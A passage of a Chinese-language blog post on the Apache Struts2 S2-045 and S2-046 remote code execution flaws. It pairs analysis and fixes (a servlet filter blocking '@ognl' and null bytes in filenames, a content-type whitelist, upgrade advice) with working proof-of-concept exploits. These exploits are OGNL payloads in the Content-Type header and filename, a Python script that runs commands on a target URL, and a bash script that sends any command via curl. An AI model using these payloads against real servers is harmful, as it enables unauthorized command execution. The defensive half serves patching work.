alt="(PrepareOperations_warprequest"><br><img data-src="Dispatcher_content-type.png" alt="Dispatcher判断content-type是否包含multipart/form-data"><br><img data-src="MultiPartRequestWrapper_paser.png" alt="MultiPartRequestWrapper构造方法中调用paser"><br><img data-src="paser_buildErrorMessage.png" alt="进入buildErrorMessage执行ognl"></p><h3><a href="#" class="headerlink"></a></h3><h3 id="S2-045-PoC-1"><a href="#S2-045-PoC-1" class="headerlink" title="S2-045 PoC_1"></a>S2-045 PoC_1</h3><p><code>Content-Type: haha~multipart/form-data %{&amp;#35;_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(&#39;calc&#39;)};</code></p><h3 id="S2-045-PoC-2"><a href="#S2-045-PoC-2" class="headerlink" title="S2-045 PoC_2"></a>S2-045 PoC_2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> poster.encode <span class="keyword">import</span> multipart_encode</span><br><span class="line"><span class="keyword">from</span> poster.streaminghttp <span class="keyword">import</span> register_openers</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">()</span>:</span></span><br><span class="line">    register_openers()</span><br><span class="line">    datagen, header = multipart_encode(&#123;<span class="string">"image1"</span>: open(<span class="string">"tmp.txt"</span>, <span class="string">"rb"</span>)&#125;)</span><br><span class="line">    header[<span class="string">"User-Agent"</span>]=<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span></span><br><span class="line">    header[<span class="string">"Content-Type"</span>]=<span class="string">"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span></span><br><span class="line">    request = urllib2.Request(str(sys.argv[<span class="number">1</span>]),datagen,headers=header)</span><br><span class="line">    response = urllib2.urlopen(request)</span><br><span class="line">    <span class="keyword">print</span> response.read()</span><br><span class="line">poc()</span><br></pre></td></tr></table></figure><h3 id="S2-046-PoC-1"><a href="#S2-046-PoC-1" class="headerlink" title="S2-046 PoC_1"></a>S2-046 PoC_1</h3><p>在Struts 2.3.20以上的版本中，Struts2才提供了可选择的通过Streams实现Jakarta组件解析的方式。<br>触发条件,使用非默认解析jakarta-stream。例在strust.xml中有加入<code>&lt;constant name=&quot;struts.multipart.parser&quot; value=&quot;jakarta-stream&quot; /&gt;</code>才能触发。<br>上传文件的大小（由Content-Length头指定）大于Struts2默认允许的最大大小（2M）。</p><p>触发漏洞的代码在 JakartaStreamMultiPartRequest类中，processUpload函数处理了content-length长度超长的异常，导致问题触发。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">processUpload</span><span class="params">(HttpServletRequest request, String saveDir)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// Sanity check that the request is a multi-part/form-data request.</span></span><br><span class="line">    <span class="keyword">if</span> (ServletFileUpload.isMultipartContent(request)) &#123;</span><br><span class="line">        <span class="comment">// Sanity check on request size.</span></span><br><span class="line">        <span class="keyword">boolean</span> requestSizePermitted = isRequestSizePermitted(request);</span><br><span class="line">        <span class="comment">// Interface with Commons FileUpload API</span></span><br><span class="line">        <span class="comment">// Using the Streaming API</span></span><br><span class="line">        ServletFileUpload servletFileUpload = <span class="keyword">new</span> ServletFileUpload();</span><br><span class="line">        FileItemIterator i = servletFileUpload.getItemIterator(request);</span><br><span class="line">        <span class="comment">// Iterate the file items</span></span><br><span class="line">        <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                FileItemStream itemStream = i.next();</span><br><span class="line">                <span class="comment">// If the file item stream is a form field, delegate to the</span></span><br><span class="line">                <span class="comment">// field item stream handler</span></span><br><span class="line">                <span class="keyword">if</span> (itemStream.isFormField()) &#123;</span><br><span class="line">                    processFileItemStreamAsFormField(itemStream);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// Delegate the file item stream for a file field to the</span></span><br><span class="line">                <span class="comment">// file item stream handler, but delegation is skipped</span></span><br><span class="line">                <span class="comment">// if the requestSizePermitted check failed based on the</span></span><br><span class="line">                <span class="comment">// complete content-size of the request.</span></span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// prevent processing file field item if request size not allowed.</span></span><br><span class="line">                    <span class="comment">// also warn user in the logs.</span></span><br><span class="line">                    <span class="keyword">if</span> (!requestSizePermitted) &#123;</span><br><span class="line">                        addFileSkippedError(itemStream.getName(), request);</span><br><span class="line">                        LOG.warn(<span class="string">"Skipped stream '#0', request maximum size (#1) exceeded."</span>, itemStream.getName(), maxSize);</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    processFileItemStreamAsFileField(itemStream, saveDir);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>触发点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOG.warn(<span class="string">"Skipped stream '#0', request maximum size (#1) exceeded."</span>, itemStream.getName(), maxSize);</span><br></pre></td></tr></table></figure><p><a href="http://www.360zhijia.com/360anquanke/186154.html">原文</a></p><p>burp修改大小发送请求失败时候，可以试着去掉菜单栏<code>Repeater--&gt;Update Content-Length</code>的勾选，然后进行实验，这样修改的大小不会在被burp修改。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /doUpload.action HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Content-Length: 10000000</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAnmUgTEhFhOZpr9z</span><br><span class="line">Connection: close</span><br><span class="line"> </span><br><span class="line">------WebKitFormBoundaryAnmUgTEhFhOZpr9z</span><br><span class="line">Content-Disposition: form-data; name="upload"; filename="%&#123;<span class="symbol">&amp;#35;</span>context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')&#125;"</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Kaboom </span><br><span class="line"> </span><br><span class="line">------WebKitFormBoundaryAnmUgTEhFhOZpr9z--</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin env python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">host=<span class="string">"xxxxx"</span></span><br><span class="line">se=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">se.connect((host,<span class="number">80</span>))</span><br><span class="line">se.send(<span class="string">"GET / HTTP/1.1\n"</span>)</span><br><span class="line">se.send(<span class="string">"User-Agent:curl/7.29.0\n"</span>)</span><br><span class="line">se.send(<span class="string">"Host:"</span>+host+<span class="string">"\n"</span>)</span><br><span class="line">se.send(<span class="string">"Accept:*/*\n"</span>)</span><br><span class="line">se.send(<span class="string">"Content-Type:multipart/form-data; boundary=---------------------------735323031399963166993862150\n"</span>)</span><br><span class="line">se.send(<span class="string">"Connection:close\n"</span>)</span><br><span class="line">se.send(<span class="string">"Content-Length:1000000000\n"</span>)</span><br><span class="line">se.send(<span class="string">"\n\n"</span>)</span><br><span class="line">se.send(<span class="string">"-----------------------------735323031399963166993862150\n"</span>)</span><br><span class="line">se.send(<span class="string">'Content-Disposition: form-data; name="foo"; filename="%&#123;&amp;#35;context[\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'].addHeader(\'X-Test\',\'Kaboom\')&#125;"\n'</span>)</span><br><span class="line">se.send(<span class="string">"Content-Type: text/plain\n\n"</span>)</span><br><span class="line">se.send(<span class="string">"x\n"</span>)</span><br><span class="line">se.send(<span class="string">"-----------------------------735323031399963166993862150--\n\n"</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  buf = se.recv(<span class="number">1024</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">print</span> buf</span><br></pre></td></tr></table></figure><p><a href="https://community.hpe.com/t5/Security-Research/Struts2-046-A-new-vector/ba-p/6949723#">原文</a></p><h3 id="S2-046-PoC-2"><a href="#S2-046-PoC-2" class="headerlink" title="S2-046 PoC_2"></a>S2-046 PoC_2</h3><p>header中的Content-Disposition中包含空字节。<br>文件名内容构造恶意的OGNL内容。</p><p><img data-src="JakartaMultiPartRequest_processUpload.png" alt="JakartaMultiPartRequest中的processUpload"><br><img data-src="JakartaMultiPartRequest_processFileField.png" alt="processFileField中处理各个header头"><br><img data-src="DiskFileItem_getName.png" alt="DiskFileItem的getName会处理NULL字符串"><br><img data-src="Streams_checkFileName.png" alt="调用Streams中的checkFileName检查NULL字符串"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"> </span><br><span class="line">url=$1</span><br><span class="line">cmd=$2</span><br><span class="line">shift</span><br><span class="line">shift</span><br><span class="line"> </span><br><span class="line">boundary="---------------------------735323031399963166993862150"</span><br><span class="line">content_type="multipart/form-data; boundary=$boundary"</span><br><span class="line">payload=$(echo "%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"$cmd"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;")</span><br><span class="line"> </span><br><span class="line">printf -- "--$boundary\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%s\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--$boundary--\r\n\r\n" "$payload" | curl "$url" -H "Content-Type: $content_type" -H "Expect: " -H "Connection: close" --data-binary @- $@</span><br></pre></td></tr></table></figure><p>验证截图</p><p><img data-src="360_check.png" alt="验证截图"></p><p><a href="http://bobao.360.cn/learning/detail/3571.html">360安全客</a><br>当\0b不可当成检测字符，\0b可以被替换成\0000,\0a - \0z 等等。所以，最好是使用多种情况。<br>多个空格<br>多个空格，且里面可以添加\r\n<br>n个空格</p><h3 id="S2-046-PoC-3"><a href="#S2-046-PoC-3" class="headerlink" title="S2-046 PoC_3"></a>S2-046 PoC_3</h3><p><a href="https://github.com/pwntester/S2-046-PoC">S2-046-PoC</a></p><h3 id="Struts2漏洞利用工具"><a href="#Struts2漏洞利用工具" class="headerlink" title="Struts2漏洞利用工具"></a>Struts2漏洞利用工具</h3><p><a href="http://www.shack2.org/article/1374154000.html">shack2的Struts2漏洞利用工具</a><br>PS:大神该工具暂不支持https</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><h3 id="严格过滤"><a href="#严格过滤" class="headerlink" title="严格过滤"></a>严格过滤</h3><p>严格过滤 Content-Type 、filename里的内容，严禁ognl表达式相关字段。</p><p>实际上，我们只需在struts的filter之前，添加上自己的filter，提前触发Content-Type 、filename的相关验证就行了。</p><p>添加filter示例<br>Struts2Filter.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.strutsfilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Struts2Filter</span> <span class="keyword">extends</span> <span class="title">StrutsPrepareAndExecuteFilter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        String contentType = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">int</span> contentLength = request.getContentLength();</span><br><span class="line">        ServletContext sctx = request.getServletContext();</span><br><span class="line">        String params = sctx.getInitParameter(<span class="string">"content-type-param"</span>);</span><br><span class="line">        <span class="keyword">if</span> (request.getContentType() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            contentType = request.getContentType().toLowerCase(Locale.ENGLISH);</span><br><span class="line">            <span class="comment">// 请求大小小于2M，不是文件上传并且是正常请求时，放过</span></span><br><span class="line">            <span class="keyword">if</span> (params.contains(contentType) &amp;&amp; contentLength &lt; <span class="number">2097152</span>) &#123;</span><br><span class="line">                <span class="keyword">super</span>.doFilter(request, response, chain);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        contentType = contentType.contains(<span class="string">","</span>) ? contentType.split(<span class="string">","</span>)[<span class="number">0</span>].trim() : contentType.split(<span class="string">";"</span>)[<span class="number">0</span>].trim(); <span class="comment">// 文件上传时过滤掉文件边界</span></span><br><span class="line">        <span class="keyword">if</span> (contentType != <span class="keyword">null</span> &amp;&amp; contentLength &lt; <span class="number">2097152000</span>) &#123; <span class="comment">// 文件上传并且文件小于2g</span></span><br><span class="line">            <span class="keyword">if</span> (!Contain_space(request)) &#123; <span class="comment">// content-type位于白名单放过并且上传的文件名称当中不包括空字节</span></span><br><span class="line">                <span class="keyword">super</span>.doFilter(request, response, chain);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                PrintWriter writer = response.getWriter();</span><br><span class="line">                writer.write(<span class="string">"reject!"</span>);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">Contain_space</span><span class="params">(ServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InputStream is = request.getInputStream();</span><br><span class="line">            BufferedReader read = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is, <span class="string">"utf-8"</span>));</span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            String tmp = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">while</span> ((tmp = read.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                sb.append(tmp + <span class="string">"\r\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            Pattern pattern = Pattern.compile(<span class="string">"filename(.*?)\r\n"</span>);</span><br><span class="line">            <span class="comment">// 从filename一直截取到下一个换行符位置，通过正则表达式过滤出上传的文件名称</span></span><br><span class="line">            Matcher matcher = pattern.matcher(sb.toString().toLowerCase(Locale.ENGLISH)); <span class="comment">// 将文件请求内容全部小写</span></span><br><span class="line">            <span class="keyword">while</span> (matcher.find()) &#123;</span><br><span class="line">                String filename = matcher.group();</span><br><span class="line">                <span class="keyword">if</span> (filename.contains(<span class="string">"\\0b"</span>) || filename.contains(<span class="string">" "</span>) || filename.contains(<span class="string">"\\u0000"</span>)</span><br><span class="line">                        || filename.contains(<span class="string">"@ognl"</span>)) &#123; <span class="comment">// 对文件名称进行过滤，筛选掉含有空字符的上传请求</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="comment">//e.printStackTrace();</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>web.xml配置参考：新增的filter需要在原有struts filter之前</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Struts 2 Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.strutsfilter.Struts2Filter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>content-type-param<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>application/octet-stream,application/pdf,application/vnd.android.package-archive,</span><br><span class="line">    application/vnd.rn-realmedia-vbr,application/x-bmp,application/x-img,application/x-javascript,</span><br><span class="line">    application/x-jpe,application/x-jpg,application/x-png,application/x-shockwave-flash,</span><br><span class="line">    application/x-x509-ca-cert,application/x-xls,audio/mp3,image/gif,image/jpeg,image/png,</span><br><span class="line">    image/x-icon,image/rfc822,text/css,text/html,text/plain,text/xml,video/mpg,video/mpeg4,video/mpg,</span><br><span class="line">    video/x-ms-wmv,application/x-www-form-urlencoded,multipart/form-data<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>正好项目中有spring，调用了spring web的MultipartResolver，对request进行wrap。这步避免了s2-045漏洞。再补上检查filename部分就行了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">MultipartResolver resolver = <span class="keyword">new</span> CommonsMultipartResolver(reqWrapper.getSession().getServletContext());</span><br><span class="line"></span><br><span class="line">MultipartHttpServletRequest multipartRequest = resolver.resolveMultipart(request);</span><br><span class="line">    <span class="comment">// 这步将调用到common-fileupload.jar的FileUploadBase.java的FileItemIteratorImpl内部类进行下列判断 if ((null == contentType)|| (!contentType.toLowerCase(Locale.ENGLISH).startsWith("multipart/")))。所以，也可以直接在后续补上这段操作</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//检查s2-046</span></span><br><span class="line">Map&lt;String,MultipartFile&gt; fileMap = multipartRequest.getFileMap();</span><br><span class="line">Collection&lt;MultipartFile&gt; col = fileMap.values();</span><br><span class="line">Iterator&lt;MultipartFile&gt; itr = col.iterator();</span><br><span class="line">MultipartFile file = <span class="keyword">null</span>;</span><br><span class="line">String fileName = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">while</span>(itr.hasNext())&#123;</span><br><span class="line">    file = itr.next();</span><br><span class="line">    file.getName();   <span class="comment">// 这部分实际上调用到的fieldName，不是文件名</span></span><br><span class="line">    fileName = file.getOriginalFilename();</span><br><span class="line">    <span class="comment">//这步将调用Streams.checkFileName()，检查文件名为NULL字符串的情况。也可以直接使用相关判断，文件名是否包含NULL字符串，OGNL字符</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上检查fileName，调用到common-fileupload.jar的Streams.checkFileName()，也是可以的。</p><h3 id="改用其他解析"><a href="#改用其他解析" class="headerlink" title="改用其他解析"></a>改用其他解析</h3><p><a href="https://cwiki.apache.org/confluence/display/S2PLUGINS/Pell+Multipart+Plugin">改用pull</a></p><h3 id="升级到Apache-Struts-2-3-32或2-5-10-1版本。（强烈推荐）"><a href="#升级到Apache-Struts-2-3-32或2-5-10-1版本。（强烈推荐）" class="headerlink" title="升级到Apache Struts 2.3.32或2.5.10.1版本。（强烈推荐）"></a>升级到Apache Struts 2.3.32或2.5.10.1版本。（强烈推荐）</h3><p>如果您使用基于Jakarta插件，请升级到Apache Struts 2.3.32或2.5.10.1版本。（强烈推荐）</p><p>针对Struts2的升级，可将原应用相关的依赖jar包替换为最新的Struts2包，其中，有三个包是必须要升级的：</p><ul><li>struts2-core-2.3.32.jar：Struts2核心包，也是此次漏洞发生的所在。</li><li>xwork-core-2.3.32.jar：Struts2依赖包，版本跟随Struts2一起更新。</li><li>ognl-3.0.19.jar：用于支持OGNL表达式，为其他包提供依赖。</li></ul><p>如果暂时不便升级，官方也已准备了两个可以作为应急使用的Jakarta插件版本，用户可以下载使用，<a href="https://github.com/apache/struts-extras">链接地址</a></p><p>补丁地址<br><a href="https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.32">Struts 2.3.32</a><br><a href="https://github.com/apache/struts/commit/b06dd50af2a3319dd896bf5c2f4972d2b772cf2b">2.3.32补丁修复方案</a></p><p><a href="https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.10.1">Struts 2.5.10.1</a><br><a href="https://github.com/apache/struts/commit/352306493971e7d5a756d61780d57a76eb1f519a">2.5.10.1补丁修复方案</a></p>]]></content>
    
    <summary type="html">
    
      解决思路，在struts filter之前提前触发该错误，避免进入执行ognl
    
    </summary>
    
    
      <category term="Java" scheme="https://blog.yanzhe.tk/categories/java/"/>
    
    
      <category term="Java" scheme="https://blog.yanzhe.tk/tags/java/"/>
    
      <category term="安全" scheme="https://blog.yanzhe.tk/tags/security/"/>
    
